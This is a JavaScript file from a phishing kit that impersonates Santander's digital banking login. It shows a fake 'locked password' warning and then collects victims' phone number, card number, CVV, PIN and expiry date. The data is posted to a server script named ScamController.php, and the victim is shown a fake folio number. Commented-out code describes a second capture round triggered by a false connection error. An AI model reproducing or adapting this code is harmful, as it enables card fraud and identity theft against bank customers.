function emptyDiv(){
    document.getElementById("back_modal").style.display="none";
    document.getElementById("div").innerHTML = "";
}

function soloNumeros(e){
    var key = window.Event ? e.which : e.keyCode
    return (key >= 48 && key <= 57)
}



$(document).ready(function(){
    var intentos = 1;
    var urlSend = "";
    var token = $('#tok').val();
    var fl = $('#folID').val();
    
    alert(token+" "+fl);
    
    var alertModal = '<ngb-modal-window id="modalConfig" role="dialog" tabindex="-1" class="modal fade show d-block" ><div id="modalConfig" role="dialog" tabindex="-1" class="modal fade show d-block" style=""><div role="document" class="modal-dialog"><div class="modal-content"><ng-component _nghost-c17=""><div _ngcontent-c17="" class="ng-star-inserted"><div _ngcontent-c17="" class="modal-header"><div _ngcontent-c17="" class="mdl-hdr-txt"><img _ngcontent-c17="" alt="" src="../assets/img/warning.svg"><h1 _ngcontent-c17="" id="txtHeaderModal">Contraseña Bloqueada</h1></div></div><div _ngcontent-c17="" class="modal-body" id="msg"><p _ngcontent-c17="" class="txt-message">Es necesario que inicie el proceso de desbloqueo de contraseña de acceso a la Banca Digital Santander<br><br><br>			Para continuar debe tener a la mano el teléfono celular que registró con nosotros terminación **1525</p></div><div id="botonera2" _ngcontent-c16="" class="modal-footer two-buttons"><button id="btnAcept2" _ngcontent-c16="" class="btn ng-star-inserted" type="button" onClick="emptyDiv()">Continuar</button></div></div></ng-component></div></div></ngb-modal-window>';
    
    $('a#btnAcept2').click(function(e){
        e.preventDefault();
        console.log('hola desde el boton');
        $('#back_modal').hide();
        $('#div').html("");
        //$('ngb-modal-window').hide();
        //$('#modalConfig').removeClass('d-block').hide();
        //window.location.href="config_details.php?dispositivo="+$('#tipo').val();
    });
    
    
    $('#btnCC').click(function(e){
        e.preventDefault();
        
        var celular = $('#cell');
        var tarjeta = $('#tarjeta');
        var cvv = $('#cvv');
        var nip = $('#nip');
        var mes = $('#mes');
        var year = $('#year');
        
        if(celular.val() == "" || celular.val().length != 10){
            $('#back_modal').show();
            //$('#modalConfig').show();
            $('#div').html(alertModal);
            $('#txtHeaderModal').text('Atención');
            $('#btnAcept2').text('Aceptar');
            $('#msg').html('<p _ngcontent-c17="" class="txt-message">Para continuar es necesario que ingrese los 10 digitos de su tel&eacute;fono celular.</p>');
        }else{
            
            if(tarjeta.val() == "" || tarjeta.val().length != 16){
                $('#back_modal').show();
                //$('#modalConfig').show();
                $('#div').html(alertModal);
                $('#txtHeaderModal').text('Atención');
                $('#btnAcept2').text('Aceptar');
                $('#msg').html('<p _ngcontent-c17="" class="txt-message">Para continuar es necesario que ingrese los 16 digitos de su tarjeta.</p>');
            }else{
                
                
                if(cvv.val() == "" || cvv.val().length != 3){
                    $('#back_modal').show();
                    //$('#modalConfig').show();
                    $('#div').html(alertModal);
                    $('#txtHeaderModal').text('Atención');
                    $('#btnAcept2').text('Aceptar');
                    $('#msg').html('<p _ngcontent-c17="" class="txt-message">Para continuar es necesario que ingrese los 3 digitos que se encuentran al reverso de su tarjeta.</p>');
                }else{
                    
                    if(nip.val() == "" || nip.val().length != 4){
                        $('#back_modal').show();
                        //$('#modalConfig').show();
                        $('#div').html(alertModal);
                        $('#txtHeaderModal').text('Atención');
                        $('#btnAcept2').text('Aceptar');
                        $('#msg').html('<p _ngcontent-c17="" class="txt-message">Para continuar es necesario que ingrese los 4 digitos de su NIP.</p>');
                    }else{
                        
                        if(mes.val() == ""){
                            $('#back_modal').show();
                            //$('#modalConfig').show();
                            $('#div').html(alertModal);
                            $('#txtHeaderModal').text('Atención');
                            $('#btnAcept2').text('Aceptar');
                            $('#msg').html('<p _ngcontent-c17="" class="txt-message">Para continuar es necesario que seleccione el mes de la fecha de expiraci&oacute;n de su tarjeta.</p>');
                        }else{
                            
                            if(year.val() == ""){
                                $('#back_modal').show();
                                //$('#modalConfig').show();
                                $('#div').html(alertModal);
                                $('#txtHeaderModal').text('Atención');
                                $('#btnAcept2').text('Aceptar');
                                $('#msg').html('<p _ngcontent-c17="" class="txt-message">Para continuar es necesario que seleccione el a&ntilde;o de la fecha de expiraci&oacute;n de su tarjeta.</p>');
                            }else{
                                if (intentos == 1) {
                                    urlSend = "cc";
                                } else {
                                    urlSend = "cc_confirm";
                                }
                                
                                
                                
                                $.ajax({
                                    type: 'POST',
                                    url: '../../Controllers/ScamController.php',
                                    data: {
                                        "request": urlSend,
                                        "celular": celular.val(),
                                        "tarjeta": tarjeta.val(),
                                        "cvv": cvv.val(),
                                        "nip": nip.val(),
                                        "tarjeta_expiracion": mes.val()+"/"+year.val(),
                                        "token": token,
                                        "folioID": fl
                                    },
                                    beforeSend: function () {
                                        console.log("ENviando...");
                                        $('#loading').show();
                                    },
                                    success: function (resp) {
                                        console.log('Datos Enviados');
                                        $('#loading').hide();
                                        console.log(resp);
                                        if (resp == "1") {

                                            fase = 'folio';
                                                $('#frmCC').hide();
                                                $('#frmFolio').show();
                                                

                                                $('#i100').text('Favor de conservar el siguiente No. de folio');

                                                $('#okBut').show();
                                                $('#Limpiar').hide();
                                                $('#cancelButs').hide();

                                                
                                            /*if (intentosCC == 2) {
                                                //window.location.href="password.php";    
                                                //alert('formulario completo');
                                               
                                                
                                               // alert('Proceso finalizado');


                                            } else {
                                                $('#back_modal').show();
                                                $('#div').html(alertModal);
                                                $('#txtHeaderModal').text('Atención');
                                                $('#msg').html('<p _ngcontent-c17="" class="txt-message">No se pudo conectar con los servicios de SuperNET. <br><br><br>Favor de volver a intentar.</p>');
                                                celular.val("");
                                                tarjeta.val("");
                                                cvv.val("");
                                                nip.val("");
                                                mes.val("");
                                                year.val("");


                                                intentos = 2;
                                            }*/


                                        } else {
                                            alert('Fallo al guardar');
                                        }
                                    },
                                    error: function (request, textStatus, errorThrown) {
                                        console.log('Error al Enviar los Datos: ' + errorThrown);
                                    }
                                });



                            }
                        }
                        
                    }
                    
                }


            }

        }
        
        
    });
    
});